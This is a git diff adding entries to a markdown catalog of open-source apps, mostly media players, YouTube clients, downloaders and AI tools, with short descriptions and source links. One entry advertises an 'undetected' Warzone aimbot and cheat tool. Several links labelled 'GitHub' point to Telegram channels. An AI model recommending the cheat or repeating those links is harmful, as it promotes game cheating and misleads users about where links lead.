+> **Categories:** `#ai_prompts` `#claude` `#claude_code` `#reddit` `#twitter` `#readme` `#instagram` `#youtube` `#social_media` `#research` `#hackernews` `#trends` `#web_search` `#bluesky` `#recency` `#tiktok` `#polymarket` `#deep_research` `#ai_skill` `#openclaw` `#clawhub` `#GitHub` `#OpenSource` `#python`
+
+Claude Code skill that researches any topic across Reddit + X from the last 30 days, then writes copy-paste-ready prompts
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/mvanhorn/last30days-skill](https://github.com/mvanhorn/last30days-skill)
+- 👤 **Developer:** [mvanhorn](https://github.com/mvanhorn)
+
+
+---
+
 ### 📦 ADB D**evice Manager
 
 > **Categories:** `#Android` `#Windows` `#ADB` `#Media`
@@ -909,6 +1509,33 @@ A free, open-source and lightweight music player for Android in modern material 
 
 ---
 
+### 📦 Qualityscaler
+
+> **Categories:** `#python` `#amd` `#anime` `#compression_artifact_reduction` `#deep_learning` `#directx_12` `#gui_application` `#intel` `#manga` `#noise_reduction` `#nvidia` `#onnx` `#onnxruntime` `#opencv` `#python3` `#pytorch` `#super_resolution` `#video` `#video_processing` `#windows` `#GitHub` `#OpenSource`
+
+QualityScaler is a free Windows AI app that upscales, enhances, and denoises your images and videos with a simple drag-and-drop GUI. It supports formats like JPG, PNG, MP4, MKV; works offline on any DirectX12 GPU (4GB+ VRAM, 8GB RAM); and offers features like multi-GPU use, resize, interpolation, and stop/resume. Download from itch.io, Steam, or GitHub. Benefit: Quickly turn low-quality photos/videos into sharp HD masterpieces privately on your PC, saving time and money vs. online tools.
+
+https://github.com/Djdefrag/QualityScaler
+
+- 🐙 **Source Code:** [https://github.com/Djdefrag/QualityScaler](https://github.com/Djdefrag/QualityScaler)
+- 👤 **Developer:** [Djdefrag](https://github.com/Djdefrag)
+
+
+---
+
+### 📦 ronitsingh10/FineTune
+
+> **Categories:** `#audio` `#audio_utility` `#macos` `#macos_app` `#menu_bar` `#menubar` `#menubar_app` `#swift` `#swiftui` `#utility`
+
+FineTune, a macOS menu bar app to control volume for each app independently, route apps to different output devices, and apply EQ
+**Language**: Swift
+
+- 🐙 **Source Code:** [https://github.com/ronitsingh10/FineTune](https://github.com/ronitsingh10/FineTune)
+- 👤 **Developer:** [ronitsingh10](https://github.com/ronitsingh10)
+
+
+---
+
 ### 📦 SkyStream
 
 > **Categories:** `#Android` `#Media` `#Streaming`
@@ -928,6 +1555,20 @@ According to early findings, the feature will be optional for developers and, du
 If released, this innovation could significantly boost interest in premium games and help users make more informed purchasing decisions, marking an important step for the mobile gaming ecosystem.
 
 - 🐙 **Source Code:** [https://www.androidauthority.com/google-play-store-try-before-you-buy-apk-teardown-3630383](https://www.androidauthority.com/google-play-store-try-before-you-buy-apk-teardown-3630383)
+
+
+---
+
+### 📦 Ytpro
+
+> **Categories:** `#javascript` `#gemini` `#generative_ai` `#node_ytdl_core` `#youtube` `#youtube_adblock` `#youtube_dislikes` `#youtube_downloader` `#youtube_downloader_android` `#youtube_player` `#youtube_vanced` `#yt_adskip` `#yt_dlp` `#yt_viewer` `#yt_views_bot` `#ytdl` `#ytdl_core` `#ytpro` `#GitHub` `#OpenSource`
+
+YT Pro is a tiny 50KB Android app that enhances YouTube with video/shorts/thumbnail/caption downloads, ad blocking, sponsor skipping, background play, PiP mode, dislike counts, Gemini AI video summaries, and auto-updates. Download the ZIP easily for quick install. It saves you time and data by blocking ads, downloading content offline, customizing playback with gestures, and summarizing long videos instantly for better productivity.
+
+https://github.com/prateek-chaubey/YTPro
+
+- 🐙 **Source Code:** [https://github.com/prateek-chaubey/YTPro](https://github.com/prateek-chaubey/YTPro)
+- 👤 **Developer:** [prateek-chaubey](https://github.com/prateek-chaubey)
 
 
 ---
@@ -983,6 +1624,46 @@ An advanced Android music tool that fetches accurate metadata and lyrics from AP
 
 ---
 
+### 📦 🔥 Trending Repository: zapret-discord-youtube-linux
+
+> **Categories:** `#readme` `#linux` `#bash` `#youtube` `#ubuntu` `#arch` `#discord` `#dpi` `#zapret` `#nftables` `#goodbyedpi` `#nfqws` `#shell`
+
+📝 **Description:** (NOW ONLY FOR NFTABLES) Port zapret-discord-youtube from Flowseal and bol-van for easy to use on linux
+
+🔗 **Repository URL:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux](https://github.com/Sergeydigl3/zapret-discord-youtube-linux)
+
+📖 **Readme:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux#readme](https://github.com/Sergeydigl3/zapret-discord-youtube-linux#readme)
+
+📊 **Statistics:**
+🌟 Stars: 805 stars
+👀 Watchers: 12
+🍴 Forks: 38 forks
+
+💻 **Programming Languages:** Shell - Batchfile
+
+🏷️ **Related Topics:**
+
+- 🐙 **Source Code:** [https://github.com/Sergeydigl3/zapret-discord-youtube-linux](https://github.com/Sergeydigl3/zapret-discord-youtube-linux)
+- 👤 **Developer:** [Sergeydigl3](https://github.com/Sergeydigl3)
+
+
+---
+
+### 📦 remorses/tuitube
+
+> **Categories:** `#GitHub` `#OpenSource` `#python` `#YouTube`
+
+Download videos from the command line with a TUI
+**Language**: TypeScript
+**Stars**: 299 **Issues**: 1 **Forks**: 9
+[https://github.com/remorses/tuitube](https://github.com/remorses/tuitube)
+
+- 🐙 **Source Code:** [https://github.com/remorses/tuitube](https://github.com/remorses/tuitube)
+- 👤 **Developer:** [remorses](https://github.com/remorses)
+
+
+---
+
 ### 📦 0xDABmusic
 
 > **Categories:** `#Linux` `#Windows` `#MacOS` `#Music`
@@ -1011,6 +1692,32 @@ An advanced Android music tool that fetches accurate metadata and lyrics from AP
 - All api keys and passwords remains upto your device only
 
 </details>
+
+
+---
+
+### 📦 FunAudioLLM/Fun-ASR
+
+> **Categories:** `#audio` `#audio_language_model` `#audio_understanding` `#fun_asr` `#multimodal_large_language_models` `#pytorch` `#speaker_diarization` `#speech_recognition` `#GitHub` `#OpenSource`
+
+Fun-ASR is an end-to-end speech recognition large model launched by Tongyi Lab.
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/FunAudioLLM/Fun-ASR](https://github.com/FunAudioLLM/Fun-ASR)
+- 👤 **Developer:** [FunAudioLLM](https://github.com/FunAudioLLM)
+
+
+---
+
+### 📦 devcarron/casino-games-web3
+
+> **Categories:** `#bep_20` `#binance` `#bitcoin` `#blockchain` `#casino` `#casino_game` `#chatroom` `#crash` `#erc_20` `#ethereum` `#game` `#mines` `#plinko` `#scissors` `#slot` `#solana` `#trc_20` `#tron` `#turtle` `#web3`
+
+casino games blockchain, multichain, solana, ethereum, bitcoin, ethereum, binance, tron, erc-20, bep-20, trc-20, A modern crypto-powered gaming platform supporting multi-chain tokens and exciting on-chain games. This platform provides a comprehensive gaming experience with real-time multiplayer gameplay, secure wallet integration.
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/devcarron/casino-games-web3](https://github.com/devcarron/casino-games-web3)
+- 👤 **Developer:** [devcarron](https://github.com/devcarron)
 
 
 ---
@@ -1143,6 +1850,22 @@ A cross-platform local music player that supports automatic matching of lyrics a
 
 ---
 
+### 📦 SmartTube
+
+> **Categories:** `#YouTube` `#Android` `#TVApp`
+
+SmartTube is a free, standalone Android TV application that provides a familiar YouTube interface while stripping out ads and enabling features typically locked behind a YouTube Premium subscription. It connects directly to YouTube's services, so you have full access to your subscriptions, playlists, and history, but it intercepts and blocks the video ads server-side before they ever reach your screen.
+
+Creator:   yuliskov
+Stars ⭐️:  26,000
+Forked by:  1,000
+
+- 🐙 **Source Code:** [https://github.com/yuliskov/SmartTube](https://github.com/yuliskov/SmartTube)
+- 👤 **Developer:** yuliskov
+
+
+---
+
 ### 📦 Aniverse
 
 > **Categories:** `#Anime` `#Android` `#Entertainment`
@@ -1218,6 +1941,23 @@ AnghamiPlus is a sophisticated Xposed module that enhances your Anghami music st
 
 ---
 
+### 📦 iptv
+
+> **Categories:** `#tvchannel` `#streaming` `#public` `#readme` `#playlist` `#tv` `#streams` `#iptv` `#m3u` `#GitHub` `#OpenSource` `#javascript` `#python` `#help_wanted` `#looking_for_contributors`
+
+This repository maintains an extensive collection of over 8,000 publicly accessible IPTV channels organized into neatly structured M3U playlists. These aren't pirated streams or sketchy links. They're legitimate public channels that broadcast freely online. The project categorizes everything by country, language, and content type, making it simple to find exactly what you're looking for.
+
+Creator:   iptv
+Stars ⭐️:  101,000
+Forked by:  4,000
+
+- 🐙 **Source Code:** [https://github.com/iptv-org/iptv](https://github.com/iptv-org/iptv)
+- 🌐 **Official Website:** [https://iptv-org.github.io](https://iptv-org.github.io)
+- 👤 **Developer:** iptv
+
+
+---
+
 ### 📦 NerdSteam
 
 > **Categories:** `#Android` `#Steam`
@@ -1238,6 +1978,19 @@ Discover trending games, player and price statistics, and detailed insights from
 - Data is sourced from multiple sources such as Steam, SteamCharts, and IsThereAnyDeal, while also caching data locally for performance.
 
 </details>
+
+
+---
+
+### 📦 LocalAI
+
+> **Categories:** `#LLM` `#opensource` `#readme` `#api` `#ai` `#mcp` `#decentralized` `#text_generation` `#distributed` `#tts` `#image_generation` `#llama` `#object_detection` `#mamba` `#libp2p` `#gemma` `#mistral` `#audio_generation` `#stable_diffusion` `#rwkv` `#musicgen` `#rerank` `#cplusplus` `#gpt4all` `#kubernetes` `#llama3` `#p2p` `#GitHub`
+
+The free, Open Source alternative to OpenAI, Claude and others. Self-hosted and local-first. Drop-in replacement for OpenAI, running on consumer-grade hardware. No GPU required. Runs gguf, transformers, diffusers and many more.
+
+- 🐙 **Source Code:** [https://github.com/mudler/LocalAI](https://github.com/mudler/LocalAI)
+- 🌐 **Official Website:** [https://localai.io](https://localai.io)
+- 👤 **Developer:** mudler
 
 
 ---
@@ -1268,6 +2021,50 @@ mpvExtended is a front-end for the versatile media player mpv, built on the libm
 
 ---
 
+### 📦 Handbrake
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+HandBrake takes the videos you already have and creates new ones from them that you can play on your mobile phone, tablet, media player, game console, computer or web browser - virtually any device that supports modern video formats.
+
+🐱** **[**GitHub**](https://t.me/github)
+
+- 🐙 **Source Code:** [https://github.com/HandBrake/HandBrake](https://github.com/HandBrake/HandBrake)
+- 👤 **Developer:** [HandBrake](https://github.com/HandBrake)
+
+
+---
+
+### 📦 Music You
+
+> **Categories:** `#typescript` `#electron` `#material_you` `#music` `#music_player` `#netease_cloud_music` `#react` `#reactjs`
+
+Music You is a free desktop music player that lets you enjoy all the features of NetEase Cloud Music on your computer, with a modern, easy-to-use design that follows Google’s Material You style. You can log in with your phone, browse recommendations, manage your music library, listen to podcasts and radio, see lyrics (including word-by-word highlights), play local files, and access your cloud music. The app is built with React and Electron, works on Windows, macOS, and Linux, and is open source—so you can even download and modify the code yourself. This gives you a smooth, full-featured music experience right on your desktop, with regular updates and a clean, customizable interface.
+
+https://github.com/GuMengYu/music-you
+
+- 🐙 **Source Code:** [https://github.com/GuMengYu/music-you](https://github.com/GuMengYu/music-you)
+- 👤 **Developer:** [GuMengYu](https://github.com/GuMengYu)
+
+
+---
+
+### 📦 MusicGPT
+
+> **Categories:** `#music` `#LLM` `#GitHub` `#OpenSource`
+
+MusicGPT is an application that allows you to run the latest music generation AI models locally, in any platform and without using heavy dependencies like Python or machine learning frameworks.
+
+Creator:  gabotechs
+Stars ⭐️:  1,000
+Forked by: 135
+
+- 🐙 **Source Code:** [https://github.com/gabotechs/MusicGPT](https://github.com/gabotechs/MusicGPT)
+- 👤 **Developer:** gabotechs
+
+
+---
+
 ### 📦 gotohp
 
 > **Categories:** `#requires` `#Media` `#Linux` `#MacOS`
@@ -1294,6 +2091,48 @@ Unofficial Google Photos Desktop GUI Client.
 
 ---
 
+### 📦 Chef
+
+> **Categories:** `#typescript` `#GitHub` `#OpenSource`
+
+Chef by Convex is an AI tool that builds complete web apps with backend features included, like a built-in database, easy user login, file uploads, real-time updates, and background tasks, all without complex setup. It uses Convex, a reactive backend platform, to handle everything smoothly and automatically. This means you can quickly create apps like social platforms or multiplayer games that work live and update instantly. You can try Chef online or run it locally, and it supports adding your own AI model keys for code generation. This saves you time and effort by automating both frontend and backend development in one place.
+
+https://github.com/get-convex/chef
+
+- 🐙 **Source Code:** [https://github.com/get-convex/chef](https://github.com/get-convex/chef)
+- 👤 **Developer:** [get-convex](https://github.com/get-convex)
+
+
+---
+
+### 📦 Xiaomusic
+
+> **Categories:** `#python` `#docker` `#docker_compose` `#music` `#pdm` `#vue` `#xiaoai` `#xiaoai_speaker` `#xiaomi` `#xiaomusic`
+
+XiaoMusic lets you play any music on your XiaoAI speaker using simple voice commands. You can install it easily with Docker or pip, then connect it to your Xiaomi account through a web interface. It downloads songs automatically and supports many formats. This means you can enjoy unlimited music, create playlists, and control playback hands-free, making your speaker much more powerful and flexible.
+
+https://github.com/hanxi/xiaomusic
+
+- 🐙 **Source Code:** [https://github.com/hanxi/xiaomusic](https://github.com/hanxi/xiaomusic)
+- 👤 **Developer:** [hanxi](https://github.com/hanxi)
+
+
+---
+
+### 📦 Vst3Sdk
+
+> **Categories:** `#cmake` `#audio` `#ios` `#linux` `#macos` `#plugins` `#sdk` `#vst3` `#win32`
+
+VST 3 is an improved version of the VST audio plug-in interface. It offers several benefits, including better performance by only processing audio when needed, dynamic input/output configurations, and precise automation. Users can also enjoy a more organized interface and support for advanced audio features like 3D sound. These improvements make it easier for developers to create plugins and for users to work with them in digital audio workstations (DAWs), enhancing overall audio production efficiency.
+
+https://github.com/steinbergmedia/vst3sdk
+
+- 🐙 **Source Code:** [https://github.com/steinbergmedia/vst3sdk](https://github.com/steinbergmedia/vst3sdk)
+- 👤 **Developer:** [steinbergmedia](https://github.com/steinbergmedia)
+
+
+---
+
 ### 📦 Giphy Trending
 
 > **Categories:** `#Android` `#Media`
@@ -1302,6 +2141,27 @@ This sample Android app presents the Giphy trending animated gifs for sharing or
 
 - 🐙 **Source Code:** [https://github.com/ryanw-mobile/giphy-trending](https://github.com/ryanw-mobile/giphy-trending)
 - 👤 **Developer:** [Ryan W](https://github.com/ryanw-mobile)
+
+
+---
+
+### 📦 Petrichor
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**Features:**
+▫️Everything you expect from a standalone music player!
+▫️Supports MP3, M4A, WAV, AAC, AIFF and FLAC file formats.
+▫️Map music folders and view your music library in an organized manner.
+▫️Create playlists and manage your play queue interactively.
+▫️If necessary, view music in the form of folders.
+▫️Pin anything (almost anything!) to the sidebar for quick access to your favorite music.
+▫️Easy navigation: right-click on a track to go to its album, artist, year, etc.
+
+🐱** **[**G**](https://t.me/economy_news)[**itHu**](https://t.me/+3xphzXTayGE1NDVi)[**b**](https://t.me/bloomeconomy)
+
+- 🐙 **Source Code:** [https://github.com/kushalpandya/Petrichor](https://github.com/kushalpandya/Petrichor)
+- 👤 **Developer:** [kushalpandya](https://github.com/kushalpandya)
 
 
 ---
@@ -1378,6 +2238,33 @@ A modern media hub built with React Native and Expo, featuring comprehensive add
 
 ---
 
+### 📦 ryanntannn/zustand-sync
+
+> **Categories:** `#multiplayer` `#state_management` `#zustand`
+
+A simple, barebones "multiplayer" middleware for zustand
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/ryanntannn/zustand-sync](https://github.com/ryanntannn/zustand-sync)
+- 👤 **Developer:** [ryanntannn](https://github.com/ryanntannn)
+
+
+---
+
+### 📦 Tiktok Youtube Douyin Handling
+
+> **Categories:** `#javascript` `#douyin` `#douyin_download` `#tiktok` `#tiktok_api` `#tiktok_downloader` `#youtube`
+
+You can use a tool that lets you download TikTok, Douyin, and YouTube videos without watermarks, and even repost them across these platforms automatically. It requires setting up Python, Node.js, and some libraries, plus a MongoDB database to store videos. The tool supports video preview, downloading, and reposting with automated login via Selenium. You can schedule video scraping every 4 hours to keep content fresh. This helps you easily collect, manage, and share high-quality videos without watermarks, saving time and effort if you want to republish or analyze popular short videos from these platforms.
+
+https://github.com/lonerge/tiktok_youtube_douyin_handling
+
+- 🐙 **Source Code:** [https://github.com/lonerge/tiktok_youtube_douyin_handling](https://github.com/lonerge/tiktok_youtube_douyin_handling)
+- 👤 **Developer:** [lonerge](https://github.com/lonerge)
+
+
+---
+
 ### 📦 Spek
 
 > **Categories:** `#Linux` `#MacOS` `#Windows` `#Audio` `#Tools`
@@ -1405,6 +2292,20 @@ Spek is a free, open-source spectrogram viewer that helps you analyze audio by v
 - Translations / multi-language UI
 
 </details>
+
+
+---
+
+### 📦 Gt New Horizons Modpack
+
+> **Categories:** `#python` `#gregtech` `#minecraft` `#modpack` `#quests` `#thaumcraft`
+
+GT New Horizons is a very large and challenging Minecraft modpack focused on GregTech, offering a deep, progressive experience starting from the Stone Age and advancing through technology tiers like steam and electricity, eventually exploring other planets and dimensions. It includes over 3000 quests that guide you through complex tech, magic, and exploration, making the game feel like one connected adventure rather than separate mods. The pack features realistic world generation, tough survival conditions, and a mix of technology and magic mods, providing a long-lasting, rewarding gameplay for players who enjoy expert-level challenges and detailed crafting systems[1][2][3]. This benefits you by offering a rich, immersive Minecraft experience that grows with your skills and keeps you engaged for a long time.
+
+https://github.com/GTNewHorizons/GT-New-Horizons-Modpack
+
+- 🐙 **Source Code:** [https://github.com/GTNewHorizons/GT-New-Horizons-Modpack](https://github.com/GTNewHorizons/GT-New-Horizons-Modpack)
+- 👤 **Developer:** [GTNewHorizons](https://github.com/GTNewHorizons)
 
 
 ---
@@ -1453,6 +2354,19 @@ A beautiful, non-destructive, and GPU-accelerated RAW image editor built with pe
 
 ---
 
+### 📦 wildminder/ComfyUI-VoxCPM
+
+> **Categories:** `#ai_voice` `#audio` `#comfyui_node` `#t2s` `#text_to_speech` `#tts` `#voice_cloning` `#voice_generation`
+
+ComfyUI node for highly expressive speech and realistic zero-shot voice cloning
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/wildminder/ComfyUI-VoxCPM](https://github.com/wildminder/ComfyUI-VoxCPM)
+- 👤 **Developer:** [wildminder](https://github.com/wildminder)
+
+
+---
+
 ### 📦 Podcaster
 
 > **Categories:** `#Android` `#Media` `#Podcast`
@@ -1491,6 +2405,71 @@ GopherTube is a terminal-based YouTube client that lets you search, preview, pla
 
 ---
 
+### 📦 Photon** - instant file upload tool
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+The program allows you to download almost any files from the Internet: documents, PDF, texts, music, videos, images and even GIF animations.
+
+**Features:**
+▫️Simultaneous upload of up to 10 files;
+▫️Easy installation;
+▫️Works locally only on your computer.
+
+We use it for free - [here](https://github.com/zmzhang8/Photon)
+
+🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/zmzhang8/Photon](https://github.com/zmzhang8/Photon)
+- 👤 **Developer:** [zmzhang8](https://github.com/zmzhang8)
+
+
+---
+
+### 📦 OpenBMB/VoxCPM
+
+> **Categories:** `#GitHub` `#OpenSource` `#readme` `#audio` `#python` `#text_to_speech` `#speech` `#pytorch` `#tts` `#speech_synthesis` `#deeplearning` `#voice_cloning` `#tts_model` `#minicpm`
+
+VoxCPM: Tokenizer-Free TTS for Context-Aware Speech Generation and True-to-Life Voice Cloning
+**Language**: Python
+**Stars**: 298 **Issues**: 4 **Forks**: 28
+[https://github.com/OpenBMB/VoxCPM](https://github.com/OpenBMB/VoxCPM)
+
+- 🐙 **Source Code:** [https://github.com/OpenBMB/VoxCPM](https://github.com/OpenBMB/VoxCPM)
+- 👤 **Developer:** [OpenBMB](https://github.com/OpenBMB)
+
+
+---
+
+### 📦 cedardb/DOOMQL
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A multiplayer DOOM-like in pure SQL
+**Language**: Python
+**Stars**: 268 **Issues**: 2 **Forks**: 11
+[https://github.com/cedardb/DOOMQL](https://github.com/cedardb/DOOMQL)
+
+- 🐙 **Source Code:** [https://github.com/cedardb/DOOMQL](https://github.com/cedardb/DOOMQL)
+- 👤 **Developer:** [cedardb](https://github.com/cedardb)
+
+
+---
+
+### 📦 Openspot Music App
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Created using modern technology, it has a beautiful responsive interface that looks great on any device.
+
+🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/BlackHatDevX/openspot-music-app](https://github.com/BlackHatDevX/openspot-music-app)
+- 👤 **Developer:** [BlackHatDevX](https://github.com/BlackHatDevX)
+
+
+---
+
 ### 📦 Shiru
 
 > **Categories:** `#Android` `#Linux` `#Windows` `#MacOS` `#Streaming` `#Entertaiment` `#Anime` `#GitHub` `#OpenSource`
@@ -1523,6 +2502,22 @@ An Android app using the Unsplash API to search, view, zoom, and download images
 
 - 🐙 **Source Code:** [https://github.com/androidwithabhishek/Image-Search-App](https://github.com/androidwithabhishek/Image-Search-App)
 - 👤 **Developer:** [abhishekgupta](https://github.com/androidwithabhishek)
+
+
+---
+
+### 📦 Pinstr
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+With Pinstr, you can easily organize your interests and find new ideas, inspiration, and recommendations. Whether you like movies, music, food, Bitcoin, Nostr or anything else, Pinstr has you covered.
+
+Additionally, you can interact with other users by liking, commenting, and liking their boards.
+
+🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/sepehr-safari/pinstr](https://github.com/sepehr-safari/pinstr)
+- 👤 **Developer:** [sepehr-safari](https://github.com/sepehr-safari)
 
 
 ---
@@ -1625,6 +2620,26 @@ Links 🔗
 
 ---
 
+### 📦 Seedbox Lite
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+— Automatically downloads movies from torrents;
+— Works on any gadget with a browser: from phone to PC;
+- No waiting - instant playback;
+— Built-in media player with subtitles, gestures and full-screen mode;
+— Installation takes a couple of minutes, there are detailed instructions.
+
+[Install](https://github.com/hotheadhacker/seedbox-lite) and stock up on popcorn.
+
+🌒 [**1337**](https://t.me/+TnMtlhTPGQ9mZmIy)
+
+- 🐙 **Source Code:** [https://github.com/hotheadhacker/seedbox-lite](https://github.com/hotheadhacker/seedbox-lite)
+- 👤 **Developer:** [hotheadhacker](https://github.com/hotheadhacker)
+
+
+---
+
 ### 📦 OpenCut
 
 > **Categories:** `#Website` `#Media` `#Editor`
@@ -1645,6 +2660,19 @@ The open-source CapCut alternative
 - Blog powered by Marble, Headless CMS.
 
 </details>
+
+
+---
+
+### 📦 vercel/streamdown
+
+> **Categories:** `#ai` `#markdown` `#streaming` `#GitHub` `#OpenSource`
+
+A drop-in replacement for react-markdown, designed for AI-powered streaming.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/vercel/streamdown](https://github.com/vercel/streamdown)
+- 👤 **Developer:** [vercel](https://github.com/vercel)
 
 
 ---
@@ -1672,6 +2700,47 @@ Instantly save any video (MP4, MKV), photo, music (MP3), or document directly fr
 
 ---
 
+### 📦 Tonzhon Music
+
+> **Categories:** `#javascript` `#antd` `#music` `#music_player` `#nodejs` `#react` `#react_router` `#redux` `#webapp` `#webpack`
+
+Copper Bell is a free website app focused on listening to music. It offers many songs and has a simple, clean design that makes it easy to find and play your favorite music. You can search for songs, make playlists, read scrolling lyrics, save songs, and create your own song lists. It does not have live broadcasts, social features, or ads, so there are no distractions and you get a pure music experience. You can use it on any modern web browser without installing anything. It works on many devices, including tablets. This way, you can enjoy music, manage your songs, and discover new tunes easily anytime and anywhere.
+
+https://github.com/enzeberg/tonzhon-music
+
+- 🐙 **Source Code:** [https://github.com/enzeberg/tonzhon-music](https://github.com/enzeberg/tonzhon-music)
+- 👤 **Developer:** [enzeberg](https://github.com/enzeberg)
+
+
+---
+
+### 📦 Revanced Manager
+
+> **Categories:** `#dart` `#android` `#flutter` `#flutter_apps` `#manager` `#modding` `#patching` `#revanced` `#Interesting` `#YouTube`
+
+ReVanced Manager is an app for Android that lets you customize and patch other apps, like YouTube, to remove ads and add features without needing subscriptions. It is easy to use, works on both rooted and non-rooted devices, and offers many options to tailor apps to your liking. You download the official app, then apply patches you want, creating a personalized, ad-free experience. This saves you money and improves app use while staying legal and supported by an active community. It is lightweight, regularly updated, and has a simple interface, making app customization safe and convenient[1][3][5].
+
+https://github.com/ReVanced/revanced-manager
+
+- 🐙 **Source Code:** [https://github.com/ReVanced/revanced-manager](https://github.com/ReVanced/revanced-manager)
+- 👤 **Developer:** [ReVanced](https://github.com/ReVanced)
+
+
+---
+
+### 📦 Jstudner/jcorp-nomad
+
+> **Categories:** `#dlna` `#esp32` `#homelab` `#jellyfin` `#low_power` `#media_server` `#offline_server` `#selfhosted` `#server` `#usb_server` `#wifi_hotspot`
+
+An extremely compact offline media server for Movies, Shows, Books, and Music.
+**Language**: HTML
+
+- 🐙 **Source Code:** [https://github.com/Jstudner/jcorp-nomad](https://github.com/Jstudner/jcorp-nomad)
+- 👤 **Developer:** [Jstudner](https://github.com/Jstudner)
+
+
+---
+
 ### 📦 NouTube
 
 > **Categories:** `#Android` `#Media`
@@ -1684,6 +2753,20 @@ YouTube and YouTube Music in a single app. No ads, plays in the background
 
 ---
 
+### 📦 Gyroflow
+
+> **Categories:** `#rust` `#fpv` `#gopro` `#gpu` `#gpu_computing` `#gyroscope` `#insta360` `#rolling_shutter_undistortion` `#sony_alpha_cameras` `#stabilization` `#video` `#video_processing` `#Interesting` `#Useful`
+
+Gyroflow is a powerful video stabilization software that uses gyroscope data from cameras like GoPro, Sony, and Insta360 to make your videos smooth and steady. It corrects lens distortion, rolling shutter effects, and can even level the horizon for a professional look. You can preview changes in real-time, use GPU acceleration for fast processing, and apply stabilization directly in popular video editors with plugins. It supports many video formats and works on Windows, Mac, Linux, Android, and iOS. Using Gyroflow helps you create high-quality, cinematic videos without bulky equipment or complicated setups[1][3][5].
+
+https://github.com/gyroflow/gyroflow
+
+- 🐙 **Source Code:** [https://github.com/gyroflow/gyroflow](https://github.com/gyroflow/gyroflow)
+- 👤 **Developer:** [gyroflow](https://github.com/gyroflow)
+
+
+---
+
 ### 📦 Booming Music
 
 > **Categories:** `#Android` `#Music`
@@ -1692,6 +2775,81 @@ Booming Music is a modern, local music player for Android that focuses on delive
 
 - 🐙 **Source Code:** [https://github.com/mardous/BoomingMusic](https://github.com/mardous/BoomingMusic)
 - 👤 **Developer:** mardous
+
+
+---
+
+### 📦 Bilitools
+
+> **Categories:** `#typescript` `#bilibili` `#download` `#rust` `#tauri_app` `#vue`
+
+BiliTools is a tool that helps you download and manage content from Bilibili. It supports downloading videos, audio, music, and subtitles in various formats. You can also use it to parse historical and real-time comments, and it includes AI summary features. The tool is easy to install on Windows and macOS and supports multiple languages. It's free and open-source, making it a convenient option for users who want to manage their Bilibili content efficiently. This tool benefits users by simplifying the process of accessing and organizing Bilibili resources.
+
+https://github.com/btjawa/BiliTools
+
+- 🐙 **Source Code:** [https://github.com/btjawa/BiliTools](https://github.com/btjawa/BiliTools)
+- 👤 **Developer:** [btjawa](https://github.com/btjawa)
+
+
+---
+
+### 📦 Agent-S
+
+> **Categories:** `#github` `#readme` `#memory` `#planning` `#cua` `#ai_agents` `#grounding` `#computer_automation` `#mllm` `#retrieval_augmented_generation` `#in_context_reinforcement_learning` `#agent_computer_interface` `#gui_agents` `#computer_use` `#computer_use_agent` `#OpenSource` `#python` `#agents` `#ai` `#multimodal` `#real_time` `#video` `#voice` `#voice_assistant` `#typescript` `#cloudflare` `#durable_objects` `#workflows` `#jupyter_notebook` `#anthropic` `#anthropic_claude` `#automation` `#claude` `#claude_code` `#claude_code_cli` `#claude_code_commands` `#claude_code_plugin` `#claude_code_plugins` `#claude_code_subagents` `#claude_skills` `#claudecode` `#claudecode_config` `#claudecode_subagents` `#orchestration` `#sub_agents` `#subagents`
+
+**
+Agent S: an open agentic framework that uses computers like a human
+
+Creator:   Simular-AI
+Stars ⭐️:  3,865
+Forked by: 377
+
+- 🐙 **Source Code:** [https://github.com/simular-ai/Agent-S](https://github.com/simular-ai/Agent-S)
+- 🌐 **Official Website:** [https://github.com/open-webui/open-webui](https://github.com/open-webui/open-webui)
+- 👤 **Developer:** Simular-AI
+
+
+---
+
+### 📦 cheats-warzone/warzone-cheats
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Warzone Cheat: Unlock your full potential with this undetected Aimbot features. Featuring the most advanced Warzone Aimbot, ESP, Radar, Skinchanger, and Unlock All Tool. Dominate every lobby with safe, precise, and user-friendly enhancements. Join thousands of players upgrading their Warzone experience.
+**Language**: C++
+**Stars**: 197 **Issues**: 0 **Forks**: 0
+[https://github.com/cheats-warzone/warzone-cheats](https://github.com/cheats-warzone/warzone-cheats)
+
+- 🐙 **Source Code:** [https://github.com/cheats-warzone/warzone-cheats](https://github.com/cheats-warzone/warzone-cheats)
+- 👤 **Developer:** [cheats-warzone](https://github.com/cheats-warzone)
+
+
+---
+
+### 📦 Ableton Mcp
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+This integration allows you to create music with prompts, create tracks, and manage Live sessions.
+
+♎️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/ahujasid/ableton-mcp](https://github.com/ahujasid/ableton-mcp)
+- 👤 **Developer:** [ahujasid](https://github.com/ahujasid)
+
+
+---
+
+### 📦 Musializer
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+The goal of the project is to create a tool for creating beautiful music visualizations and their high-quality video downloads.
+
+♎️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/tsoding/musializer](https://github.com/tsoding/musializer)
+- 👤 **Developer:** [tsoding](https://github.com/tsoding)
 
 
 ---
@@ -1740,6 +2898,34 @@ YouLy+ is a browser extension that enhances your YouTube Music experience by pro
 
 ---
 
+### 📦 Spaghettikart
+
+> **Categories:** `#c_lang`
+
